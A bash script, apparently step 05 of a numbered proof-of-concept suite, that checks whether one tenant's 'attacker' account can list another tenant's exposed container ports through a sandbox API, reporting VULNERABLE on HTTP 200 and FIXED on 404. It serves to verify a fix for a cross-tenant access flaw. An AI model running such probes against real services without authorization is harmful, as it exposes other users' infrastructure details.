#!/usr/bin/env bash
# 05 — Attacker lists exposed ports on the victim's container.
# Vulnerable: 200 with the victim's port list.
# Fixed:      404 (container not in the attacker's tenant-scoped registry).
set -euo pipefail
# shellcheck source=_lib.sh
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_lib.sh"

banner "05  Attacker lists victim exposed ports"
require_state attacker.json
require_state victim-container-name

victim_container="$(cat "${STATE_DIR}/victim-container-name")"
path="/api/sandbox/containers/${victim_container}/expose"

body="$(api attacker GET "${path}")"
print_http
echo "${body}" | jq . 2>/dev/null || echo "${body}"
echo "${body}" > "${STATE_DIR}/attacker-list-ports.json"

http="$(last_http)"
echo
echo "  GET ${path}"

case "${http}" in
  200)
    verdict VULNERABLE "attacker read exposed ports on ${victim_container} (HTTP 200)"
    ;;
  404)
    verdict FIXED "attacker could not see victim container ports (HTTP 404)"
    ;;
  *)
    verdict INCONCLUSIVE "unexpected HTTP ${http} listing victim ports"
    exit 1
    ;;
esac

echo
echo "Next: ./06-attacker-expose-port.sh"
